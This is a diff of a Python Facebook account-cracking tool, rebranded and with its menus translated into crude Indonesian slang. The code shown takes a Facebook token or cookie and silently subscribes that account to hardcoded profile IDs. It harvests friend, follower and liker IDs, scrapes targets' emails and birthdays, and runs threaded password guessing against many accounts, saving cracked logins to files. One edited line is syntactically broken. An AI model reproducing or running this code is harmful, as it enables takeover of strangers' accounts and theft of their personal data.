@@ -33,7 +33,7 @@ else:
 ### HEADERS ###
 
 def banner():
-    print("""\x1b[0;37m   ___                   \n  / _ \_______             ® \n / ___/ __/ -_) Multi Brute  ┌──────────────────────────────┐\n/_/  /_/__\__/(_) Force 3.0  │  Reno  │\n       /  ^ \/ / // /  ^ \   │   •• Github.com/nightraidteam ••   │\n      /_/_/_/_/\_,_/_/_/_/   └──────────────────────────────┘""")
+    print("""\x1b[0;37m   ___                   \n  / _ \_______             ® \n / ___/ __/ -_) Multi Brute  ┌──────────────────────────────┐\n/_/  /_/__\__/(_) Force 3.9  │  Aang  │\n       /  ^ \/ / // /  ^ \   │   •• Github.com/AngCyber ••   │\n      /_/_/_/_/\_,_/_/_/_/   └──────────────────────────────┘""")
 
 host="https://mbasic.facebook.com"
 ok = []
@@ -114,16 +114,15 @@ def gets_dict_cookies(cookies):
 def country():
     os.system("clear")
     banner()
-    print("\n%s[%s Choose Country %s]\n"%(k,p,k))
-    print("%s[%s1%s] %sIndonesia coeg"%(k,p,k,p))
-    print("%s[%s2%s] %sPrindapan/India"%(k,p,k,p))
-    print("%s[%s3%s] %sPakistan"%(k,p,k,p))
-    print("%s[%s4%s] %sUSA"%(k,p,k,p))
-    print("%s[%s0%s] %sNone"%(k,p,k,p))
+    print("\n%s[%s Pilih Negara %s]\n"%(k,p,k))
+    print("%s[%s01%s] %sIndonesia (Warga +62)"%(k,p,k,p))
+    print("%s[%s02%s] %sAca Aca (India)"%(k,p,k,p))
+    print("%s[%s03%s] %sPakistan (Perang Tros)"%(k,p,k,p))
+    print("%s[%s04%s] %sUSA (Negara Lord Jordi)"%(k,p,k,p))
     choose_country()
     
 def choose_country():
-    cc = input("\n%s[%s•%s] %sChoose : "%(k,p,k,p))
+    cc = input("\n%s[%s•%s] %sPilih : "%(k,p,k,p))
     if cc in[""]:
         print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
     elif cc in["1","01"]:
@@ -184,10 +183,10 @@ def choose_country():
 def logs():
   os.system("clear")
   banner()
-  print((k+"\n["+p+"1"+k+"]"+p+" Login Token"))
-  print((k+"["+p+"2"+k+"]"+p+" Login Cookies"))
-  print((k+"["+p+"0"+k+"]"+p+" Exit"))
-  sek=input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
+  print((k+"\n["+p+"01"+k+"]"+p+" Login Pakai Token"))
+  print((k+"["+p+"02"+k+"]"+p+" Login Pakai Cookies"))
+  print((k+"["+p+"00"+k+"]"+p+" Keluar (Ahh Ngecrot)"))
+  sek=input(k+"\n["+p+"•"+k+"]"+p+" Pilih : ")
   if sek=="":
     print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
     logs()
@@ -206,7 +205,7 @@ def logs():
 def log_token():
     os.system("clear")
     banner()
-    toket = input(k+"\n["+p+"•"+k+"]"+p+" Token : ")
+    toket = input(k+"\n["+p+"?"+k+"]"+p+" Token nya ngab : ")
     try:
         otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
         a = json.loads(otw.text)
@@ -214,17 +213,17 @@ def log_token():
         zedd = open("login.txt", "w")
         zedd.write(toket)
         zedd.close()
-        print((k+"\n["+p+"•"+k+"]"+p+" Login Successful"))
+        print((k+"\n["+p+"•"+k+"]"+p+" Berhasil masuk, sabar tod..."))
         bot_follow()
     except KeyError:
-        print((k+"["+p+"!"+k+"]"+p+" Token Invalid"))
+        print((k+"["+p+"!"+k+"]"+p+" Token Invalid Kentod!!"))
         os.system("clear")
         logs()
 
 def gen():
         os.system("clear")
         banner()
-        cookie = input(k+"\n["+p+"•"+k+"]"+p+" Cookies : ")
+        cookie = input(k+"\n["+p+"?"+k+"]"+p+" Cookies nya ngab : ")
         try:
                 data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
                 "user-agent"                : "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36", # Jangan Di Ganti Ea Anjink.
@@ -244,13 +243,13 @@ def gen():
         except requests.exceptions.ConnectionError:
                 print((k+"["+p+"!"+k+"]"+p+" No Connection"))
         except [KeyError,IOError]:
-            print((k+"["+p+"!"+k+"]"+p+" Cookies Invalid"))
+            print((k+"["+p+"!"+k+"]"+p+" Cookies Invalid Kentod!!"))
             os.system("clear")
             logs()
         cookie = open("login.txt", "w")
         cookie.write(find_token.group(1))
         cookie.close()
-        print((k+"\n["+p+"•"+k+"]"+p+" Login Sukses njir"))
+        print((k+"\n["+p+"•"+k+"]"+p+" Berhasil masuk, sabar tod..."))
         bot_follow()
 
 ### BOT FOLLOW ### Jangan Diganti Anjing !!!
@@ -263,9 +262,9 @@ def bot_follow():
 		nama = a["name"]
 		id = a["id"]
 	except IOError:
-		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
+		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid Kentod!!"))
 		logs()
-	jalan("%s[%s•%s] %sTunggu bentar coeg..."%(k,p,k,p))
+	jalan("%s[%s•%s] %sSabar tod, sedang masuk..."%(k,p,k,p))
 	requests.post("https://graph.facebook.com/1827084332/subscribers?access_token=" + toket)      # Dapunta Khurayra X
 	requests.post("https://graph.facebook.com/1673250723/subscribers?access_token=" + toket)      # Dapunta Ratya
 	requests.post("https://graph.facebook.com/100000431996038/subscribers?access_token=" + toket) # Almira Gabrielle X
@@ -315,25 +314,25 @@ def menu():
         negara = "None"
     os.system("clear")
     banner()
-    print((k+"\n[ "+p+"Welcome "+a["name"]+k+" ]"+p))
-    print((k+"\n["+p+"•"+k+"]"+p+" Your ID : "+id))
-    print((k+"["+p+"•"+k+"]"+p+" Your IP : "+ip))
-    print((k+"["+p+"•"+k+"]"+p+" Status  : "+m+"Test Version"+p))
-    print((k+"["+p+"•"+k+"]"+p+" Joined  : "+durasi))
-    print((k+"["+p+"•"+k+"]"+p+" Crack   : "+negara))
-    print((k+"\n["+p+"1"+k+"]"+p+" Crack ID dari Publik/FL"))
-    print((k+"["+p+"2"+k+"]"+p+" Crack ID From Followers"))
-    print((k+"["+p+"3"+k+"]"+p+" Crack ID From Likers Post"))
-    print((k+"["+p+"4"+k+"]"+p+" Crack By Phone Number"))
-    print((k+"["+p+"5"+k+"]"+p+" Crack By Email"))
-    print((k+"["+p+"6"+k+"]"+p+" Get Data Target"))
-    print((k+"["+p+"7"+k+"]"+p+" Result Crack"))
-    print((k+"["+p+"8"+k+"]"+p+" User Agent"))
-    print((k+"["+p+"0"+k+"]"+p+" Logout"))
+    print((k+"\n[ "+p+"Selamat Datangatang "+a["name"]+k+" ]"+p))
+    print((k+"\n["+p+"+"+k+"]"+p+" ID KAMU : "+id))
+    print((k+"["+p+"+"+k+"]"+p+" IP KAMU : "+ip))
+    print((k+"["+p+"+"+k+"]"+p+" Status  : "+m+"Jomblo"+p))
+    print((k+"["+p+"+"+k+"]"+p+" Joined  : "+durasi))
+    print((k+"["+p+"+"+k+"]"+p+" Crack   : "+negara))
+    print((k+"\n["+p+"01"+k+"]"+p+" Crack ID Fari Publik/Followers"))
+    print((k+"["+p+"02"+k+"]"+p+" Crack ID Dari Followers"))
+    print((k+"["+p+"03"+k+"]"+p+" Crack ID Drom Like Postingan"))
+    print((k+"["+p+"04"+k+"]"+p+" Crack Melalui Nomor Telepon"))
+    print((k+"["+p+"05"+k+"]"+p+" Crack Melalui Email"))
+    print((k+"["+p+"06"+k+"]"+p+" Ambil Data Target"))
+    print((k+"["+p+"07"+k+"]"+p+" Lihat Hasil Crack"))
+    print((k+"["+p+"08"+k+"]"+p+" Cek User Agent"))
+    print((k+"["+p+"00"+k+"]"+p+" Keluar (Ahh Ngecrot)"))
     choose_menu()
 
 def choose_menu():
-	r=input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
+	r=input(k+"\n["+p+"•"+k+"]"+p+" Pilih : ")
 	if r=="":
 		print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
 		menu()
@@ -355,22 +354,22 @@ def choose_menu():
 		menu_user_agent()
 	elif r=="0":
 		try:
-			jalan(k+"\n["+p+"•"+k+"]"+p+" Mantap coeg")
+			jalan(k+"\n["+p+"+"+k+"]"+p+" Mantap Tod...")
 			os.system("rm -rf login.txt")
 			exit()
 		except Exception as e:
 			print((k+"["+p+"!"+k+"]"+p+" Error %s"%e))
 	else:
-		print((k+"["+p+"!"+k+"]"+p+" Wrong Input"))
+		print((k+"["+p+"!"+k+"]"+p+" Isi Yang Bener Kentod!!"))
 		menu()	
 
 def pilihcrack(file):
-  print((k+"\n["+p+"1"+k+"]"+p+" Api ("+k+"cepet ibarat anime kayak minato"+p+")"))
-  print((k+"["+p+"2"+k+"]"+p+" Api + TTL ("+k+"cepet ibarat anime kayak Koro Sensei"+p+")"))
-  print((k+"["+p+"3"+k+"]"+p+" Mbasic ("+k+"lambat ibarat anime kayak Takemichi"+p+")"))
-  print((k+"["+p+"4"+k+"]"+p+" Mbasic + TTL ("+k+"lambat ibarat anime kayak Joestar"+p+")"))
-  print((k+"["+p+"5"+k+"]"+p+" Free Facebook ("+k+"lambat banget kayak mangaka wampis alias oda"+p+")"))
-  krah=input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
+  print((k+"\n["+p+"01"+k+"]"+p+" Api ("+k+"Cepat Tapi Gampang Kena Spam"+p+")"))
+  print((k+"["+p+"02"+k+"]"+p+" Api + TTL ("+k+"Cepat + TTL "+p+")"))
+  print((k+"["+p+"03"+k+"]"+p+" Mbasic ("+k+"Lambat Gak Gampang Kena Spam"+p+")"))
+  print((k+"["+p+"04"+k+"]"+p+" Mbasic + TTL ("+k+"Lambat + TTL"+p+")"))
+  print((k+"["+p+"05"+k+"]"+p+" Free Facebook ("+k+"Sangat Lambat Kemungkinan OK 80%"+p+")"))
+  krah=input(k+"\n["+p+"•"+k+"]"+p+" Pilih : ")
   if krah in[""]:
     print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
     pilihcrack(file)
@@ -394,19 +393,19 @@ def publik():
 	try:
 		toket=open("login.txt","r").read()
 	except IOError:
-		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid"))
+		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid Kentod"))
 		os.system("rm -rf login.txt")
 		logs()
 	try:
-		print((k+"\n["+p+"•"+k+"]"+p+" Type \'me\' To Dump From Friendlist"))
-		idt = input(k+"["+p+"•"+k+"]"+p+" User ID Target : ")
+		print((k+"\n["+p+"+"+k+"]"+p+" Ketik \'me\' Untuk Mengambil ID Teman"))
+		idt = input(k+"["+p+"?"+k+"]"+p+" ID Target : ")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
+			print((k+"["+p+"?"+k+"]"+p+" Name : "+op["name"]))
 		except KeyError:
-			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
-			print((k+"\n[ "+p+"Back"+k+" ]"+p))
+			print((k+"["+p+"!"+k+"]"+p+" ID Tidak Ada Kentod"))
+			print((k+"\n[ "+p+"Kembali"+k+" ]"+p))
 			publik()
 		r=requests.get("https://graph.facebook.com/"+idt+"/friends?limit=10000&access_token="+toket)
 		id = []
@@ -417,7 +416,7 @@ def publik():
 			id.append(a["id"]+"<=>"+a["name"])
 			ys.write(a["id"]+"<=>"+a["name"]+"\n")
 		ys.close()
-		print((k+"["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id))))
+		print((k+"["+p+"+"+k+"]"+p+" Total ID : %s"%(len(id))))
 		return pilihcrack(qq)
 	except Exception as e:
 		exit(k+"["+p+"!"+k+"]"+p+" Error : %s"%e)
@@ -426,18 +425,18 @@ def follow():
 	try:
 		toket=open("login.txt","r").read()
 	except IOError:
-		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid"))
+		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid Kentod!!"))
 		os.system("rm -rf login.txt")
 		logs()
 	try:
-		idt = input(k+"\n["+p+"•"+k+"]"+p+" Followers ID Target : ")
+		idt = input(k+"\n["+p+"?"+k+"]"+p+" Followers ID Target : ")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
+			print((k+"["+p+"?"+k+"]"+p+" Nama : "+op["name"]))
 		except KeyError:
-			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
-			print((k+"\n[ "+p+"Back"+k+" ]"+p))
+			print((k+"["+p+"!"+k+"]"+p+" ID Tidak Ada Kentod!!"))
+			print((k+"\n[ "+p+"Kembali"+k+" ]"+p))
 			publik()
 		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
 		id = []
@@ -448,7 +447,7 @@ def follow():
 			id.append(a["id"]+"<=>"+a["name"])
 			ys.write(a["id"]+"<=>"+a["name"]+"\n")
 		ys.close()
-		print((k+"["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id))))
+		print((k+"["+p+"+"+k+"]"+p+" Total ID : %s"%(len(id))))
 		return pilihcrack(qq)
 	except Exception as e:
 		exit(k+"["+p+"!"+k+"]"+p+" Error : %s"%e)
@@ -457,18 +456,18 @@ def likers():
 	try:
 		toket=open("login.txt","r").read()
 	except IOError:
-		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid"))
+		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid Kentod!!"))
 		os.system("rm -rf login.txt")
 		logs()
 	try:
-		idt = input(k+"\n["+p+"•"+k+"]"+p+" ID Post Target : ")
+		idt = input(k+"\n["+p+"?"+k+"]"+p+" ID Postingan Target : ")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
+			print((k+"["+p+"?"+k+"]"+p+" Nama : "+op["name"]))
 		except KeyError:
-			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
-			print((k+"\n[ "+p+"Back"+k+" ]"+p))
+			print((k+"["+p+"!"+k+"]"+p+" ID Tidak Ada Kentod!!"))
+			print((k+"\n[ "+p+"Kembali"+k+" ]"+p))
 			publik()
 		r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=100000&access_token="+toket)
 		id = []
@@ -479,7 +478,7 @@ def likers():
 			id.append(a["id"]+"<=>"+a["name"])
 			ys.write(a["id"]+"<=>"+a["name"]+"\n")
 		ys.close()
-		print((k+"["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id))))
+		print((k+"["+p+"+"+k+"]"+p+" Total ID : %s"%(len(id))))
 		return pilihcrack(qq)
 	except Exception as e:
 		exit(k+"["+p+"!"+k+"]"+p+" Error : %s"%e)
@@ -488,17 +487,17 @@ def likers():
 
 def random_numbers():
   data = []
-  print((k+"\n["+p+"•"+k+"]"+p+" Number Must Be 5 Digit"))
-  print((k+"["+p+"•"+k+"]"+p+" Example : 92037"))
-  kode=str(input(k+"["+p+"•"+k+"]"+p+" Input Number : "))
-  exit((k+"\n["+p+"!"+k+"]"+p+" Number Must Be 5 Digit")) if len(kode) < 5 else ''
-  exit((k+"\n["+p+"!"+k+"]"+p+" Number Must Be 5 Digit")) if len(kode) > 5 else ''
-  jml=int(input(k+"["+p+"•"+k+"]"+p+" Amount : "))
+  print((k+"\n["+p+"•"+k+"]"+p+" Nomor Harus 5 Digit"))
+  print((k+"["+p+"•"+k+"]"+p+" Contoh : 92037"))
+  kode=str(input(k+"["+p+"•"+k+"]"+p+" Masukan Nomor : "))
+  exit((k+"\n["+p+"!"+k+"]"+p+" Nomor Harus 5 Digit")) if len(kode) < 5 else ''
+  exit((k+"\n["+p+"!"+k+"]"+p+" Nomor Harus 5 Digit")) if len(kode) > 5 else ''
+  jml=int(input(k+"["+p+"+"+k+"]"+p+" Jumlah : "))
   [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:])]}) for e in [str(kode)+''.join(['%s'%(randint(0,9)) for i in range(0,7)]) for e in range(jml)]]
-  print(k+"\n["+p+"•"+k+"]"+p+" Crack Started, Please Wait...\n")
+  print(k+"\n["+p+"¢"+k+"]"+p+" Crack Berjalan Tunggu Tod...\n")
   with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
     {th.submit(brute, user['user'], user['pw']): user for user in data}
-  input(k+"\n[ "+p+"Back"+k+" ]"+p)
+  input(k+"\n[ "+p+"Kembali"+k+" ]"+p)
   menu()
 
 def random_email():
@@ -510,14 +509,14 @@ def random_email():
     'y':'@yahoo.com',
     'h':'@hotmail.com'
   }
-  exit((k+"["+p+"•"+k+"]"+p+" Fill In The Correct")) if not domain in ['g','y','h'] else ''
-  jml=int(input(k+"["+p+"•"+k+"]"+p+" Amount : "))
-  setpw=input(k+"["+p+"•"+k+"]"+p+" Set Password : ").split(',')
-  print(k+"\n["+p+"•"+k+"]"+p+" Crack Started, Please Wait...\n")
+  exit((k+"["+p+"!"+k+"]"+p+" Isi Yang Benar!!")) if not domain in ['g','y','h'] else ''
+  jml=int(input(k+"["+p+"+"+k+"]"+p+" Jumlah : "))
+  setpw=input(k+"["+p+"+"+k+"]"+p+" Masukan Kata Sandi : ").split(',')
+  print(k+"\n["+p+"¢"+k+"]"+p+" Crack Berjalan, Tunggu Tod...\n")
   [data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,jml+1)]
   with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
     {th.submit(brute, user['user'], user['pw']): user for user in data}
-  input(k+"\n[ "+p+"Back"+k+" ]"+p)
+  input(k+"\n[ "+p+"Kembali"+k+" ]"+p)
   menu()
 
 def brute(user, passs):
@@ -550,28 +549,28 @@ def target():
 	try:
 		toket=open("login.txt","r").read()
 	except IOError:
-		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
+		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid Kentod!!"))
 		os.system("rm -rf login.txt")
 		login()
 	try:
-		idt = input(k+"\n["+p+"•"+k+"]"+p+" ID Target        : ")
+		idt = input(k+"\n["+p+"?"+k+"]"+p+" ID Target        : ")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			print((k+"["+p+"•"+k+"]"+p+" Name Account     : "+op["name"]))
-			print((k+"["+p+"•"+k+"]"+p+" Username         : "+op["username"]))
+			print((k+"["+p+"+"+k+"]"+p+" Nama Akun     : "+op["name"]))
+			print((k+"["+p+"+"+k+"]"+p+" Username         : "+op["username"]))
 			try:
 				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 				op = json.loads(jok.text)
-				print((k+"["+p+"•"+k+"]"+p+" Email            : "+op["email"]))
+				print((k+"["+p+"+"+k+"]"+p+" Email            : "+op["email"]))
 			except KeyError:
-				print((k+"["+p+"•"+k+"]"+p+" Email            : -"))
+				print((k+"["+p+"+"+k+"]"+p+" Email            : -"))
 			try:
 				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 				op = json.loads(jok.text)
-				print((k+"["+p+"•"+k+"]"+p+" Date Of Birth    : "+op["birthday"]))
+				print((k+"["+p+"+"+k+"]"+p+" Tanggal Lahir    : "+op["birthday"]))
 			except KeyError:
-				print((k+"["+p+"•"+k+"]"+p+" Date Of Birth    : -"))
+				print((k+"["+p+"+"+k+"]"+p+" Tanggal Lahir    : -"))
 			try:
 				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 				op = json.loads(jok.text)
@@ -588,9 +587,9 @@ def target():
 					id.append(i["id"])
 					ys.write(i["id"])
 				ys.close()
-				print((k+"["+p+"•"+k+"]"+p+" Total Friend     : %s"%(len(id))))
+				print((k+"["+p+"+"+k+"]"+p+" Total Teman     : %s"%(len(id))))
 			except KeyError:
-				print((k+"["+p+"•"+k+"]"+p+" Total Friend     : -"))
+				print((k+"["+p+"+"+k+"]"+p+" Total Teman     : -"))
 			try:
 				a=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
 				id = []
@@ -601,29 +600,29 @@ def target():
 					id.append(c["id"])
 					jw.write(c["id"])
 				jw.close()
-				print((k+"["+p+"•"+k+"]"+p+" Total Follower   : %s"%(len(id))))
+				print((k+"["+p+"+"+k+"]"+p+" Total Follower   : %s"%(len(id))))
 			except KeyError:
-				print((k+"["+p+"•"+k+"]"+p+" Total Follower   : -"))
+				print((k+"["+p+"+"+k+"]"+p+" Total Follower   : -"))
 			try:
 				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 				op = json.loads(jok.text)
-				print((k+"["+p+"•"+k+"]"+p+" Website          : "+op["website"]))
+				print((k+"["+p+"+"+k+"]"+p+" Website          : "+op["website"]))
 			except KeyError:
-				print((k+"["+p+"•"+k+"]"+p+" Website          : -"))
+				print((k+"["+p+"+"+k+"]"+p+" Website          : -"))
 			except IOError:
-				print((k+"["+p+"•"+k+"]"+p+" Website          : -"))
+				print((k+"["+p+"+"+k+"]"+p+" Website          : -"))
 			try:
 				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 				op = json.loads(jok.text)
-				print((k+"["+p+"•"+k+"]"+p+" Update Time      : "+op["updated_time"]))
+				print((k+"["+p+"+"+k+"]"+p+" Waktu Update      : "+op["updated_time"]))
 			except KeyError:
-				print((k+"["+p+"•"+k+"]"+p+" Update Time      : -"))
+				print((k+"["+p+"+"+k+"]"+p+" Waktu Update      : -"))
 			except IOError:
-				print((k+"["+p+"•"+k+"]"+p+" Update Time      : -"))
-			input(k+"\n[ "+p+"Back"+k+" ]"+p)
+				print((k+"["+p+"+"+k+"]"+p+" Waktu Update      : -"))
+			input(k+"\n[ "+p+"Kembali"+k+" ]"+p)
 			menu()
 		except KeyError:
-			input(k+"\n[ "+p+"Back"+k+" ]"+p)
+			input(k+"\n[ "+p+"Kembali"+k+" ]"+p)
 			menu()
 	except Exception as e:
 		exit(k+"["+p+"•"+k+"]"+p+" Error : %s"%e)
@@ -678,15 +677,15 @@ def defaultua():
         logs()
 
 def menu_user_agent():
-    print("\n%s[%s1%s] %sGet User Agent"%(k,p,k,p))
-    print("%s[%s2%s] %sChange User Agent"%(k,p,k,p))
-    print("%s[%s3%s] %sRemove User Agent"%(k,p,k,p))
-    print("%s[%s4%s] %sCheck User Agent"%(k,p,k,p))
-    print("%s[%s0%s] %sBack"%(k,p,k,p))
+    print("\n%s[%s01%s] %sGet User Agent"%(k,p,k,p))
+    print("%s[%s02%s] %sUbah User Agent"%(k,p,k,p))
+    print("%s[%s03%s] %sHapus User Agent"%(k,p,k,p))
+    print("%s[%s04%s] %sCek User Agent"%(k,p,k,p))
+    print("%s[%s00%s] %sKembali"%(k,p,k,p))
     pilih_menu_user_agent()
 
 def pilih_menu_user_agent():
-    pmu = input("\n%s[%s•%s] %sChoose : "%(k,p,k,p))
+    pmu = input("\n%s[%s•%s] %sPilih : "%(k,p,k,p))
     if pmu in[""]:
         print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
     elif pmu in["1","01"]:
@@ -803,9 +802,9 @@ class crack:
 		self.ada=[]
 		self.cp=[]
 		self.ko=0
-		print((k+"\n["+p+"•"+k+"]"+p+" Crack With Pass Default/Manual [d/m]"))
+		print((k+"\n["+p+"?"+k+"]"+p+" Ingin Menggunakan Password Manual [d/m]"))
 		while True:
-			f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
+			f=input(k+"["+p+"•"+k+"]"+p+" Pilih : ")
 			if f=="":continue
 			elif f=="m":
 				try:
@@ -825,7 +824,7 @@ class crack:
 				except Exception as e:
 					print(("   %s"%e))
 					continue
-				print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
+				print((k+"["+p+"•"+k+"]"+p+" Contoh : sayang,bismillah,123456"))
 				self.pwlist()
 				break
 			elif f=="d":
@@ -845,7 +844,7 @@ class crack:
 						except:continue
 				except Exception as e:
 					print(("   %s"%e))
-				print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt"+k+"\n["+p+"•"+k+"]"+p+" If No Result, Use Airplane Mode (5 Sec)\n"))
+				print((k+"\n["+p+"+"+k+"]"+p+" Crack Berjalan, Tunggu Tod..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Jika tidak ada hasil, gunakan mode pesawat (3 detik)\n"))
 				ThreadPool(35).map(self.main,self.fl)
 				os.remove(self.apk)
 				exit()
@@ -857,7 +856,7 @@ class crack:
 		else:
 			for i in self.fl:
 				i.update({"pw":self.pw})
-			print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt"+k+"\n["+p+"•"+k+"]"+p+" If No Result, Use Airplane Mode (5 Sec)\n"))
+			print((k+"\n["+p+"+"+k+"]"+p+" Crack Berjalan, Tunggu Tod..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt"+k+"\n["+p+"•"+k+"]"+p+" If No Result, Use Airplane Mode (5 Sec)\n"))
 			ThreadPool(30).map(self.main,self.fl)
 			os.remove(self.apk)
 			exit()
@@ -890,9 +889,9 @@ class crackttl:
 		self.ada=[]
 		self.cp=[]
 		self.ko=0
-		print((k+"\n["+p+"•"+k+"]"+p+" Crack With Pass Default/Manual [d/m]"))
+		print((k+"\n["+p+"?"+k+"]"+p+" Ingin Menggunakan Password Manual [d/m]"))
 		while True:
-			f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
+			f=input(k+"["+p+"•"+k+"]"+p+" Pilih : ")
 			if f=="":continue
 			elif f=="m":
 				try:
@@ -912,7 +911,7 @@ class crackttl:
 				except Exception as e:
 					print(("   %s"%e))
 					continue
-				print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
+				print((k+"["+p+"•"+k+"]"+p+" Contoh : sayang,bismillah,123456"))
 				self.pwlist()
 				break
 			elif f=="d":
@@ -932,7 +931,7 @@ class crackttl:
 						except:continue
 				except Exception as e:
 					print(("   %s"%e))
-				print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt"+k+"\n["+p+"•"+k+"]"+p+" If No Result, Use Airplane Mode (5 Sec)\n"))
+				print((k+"\n["+p+"•+"bisa+k+"]"+p+" Crack Berjalan, Tunggu Tod.."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt"+k+"\n["+p+"•"+k+"]"+p+" If No Result, Use Airplane Mode (5 Sec)\n"))
 				ThreadPool(35).map(self.main,self.fl)
 				os.remove(self.apk)
 				exit()
@@ -944,7 +943,7 @@ class crackttl:
 		else:
 			for i in self.fl:
 				i.update({"pw":self.pw})
-			print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt"+k+"\n["+p+"•"+k+"]"+p+" If No Result, Use Airplane Mode (5 Sec)\n"))
+			print((k+"\n["+p+"+"+k+"]"+p+" Crack Berjalan, Tunggu Tod..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt"+k+"\n["+p+"•"+k+"]"+p+" If No Result, Use Airplane Mode (5 Sec)\n"))
 			ThreadPool(30).map(self.main,self.fl)
 			os.remove(self.apk)
 			exit()
@@ -992,9 +991,9 @@ class crackffb:
 		self.ada=[]
 		self.cp=[]
 		self.ko=0
-		print((k+"\n["+p+"•"+k+"]"+p+" Crack With Pass Default/Manual [d/m]"))
+		print((k+"\n["+p+"?"+k+"]"+p+" Ingin Menggunakan Password Manual [d/m]"))
 		while True:
-			f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
+			f=input(k+"["+p+"•"+k+"]"+p+" Pilih : ")
 			if f=="":continue
 			elif f=="m":
 				try:
@@ -1014,7 +1013,7 @@ class crackffb:
 				except Exception as e:
 					print(("   %s"%e))
 					continue
-				print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
+				print((k+"["+p+"•"+k+"]"+p+" Contoh : sayang,bismillah,123456"))
 				self.pwlist()
 				break
 			elif f=="d":
@@ -1034,7 +1033,7 @@ class crackffb:
 						except:continue
 				except Exception as e:
 					print(("   %s"%e))
-				print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt"+k+"\n["+p+"•"+k+"]"+p+" If No Result, Use Airplane Mode (5 Sec)\n"))
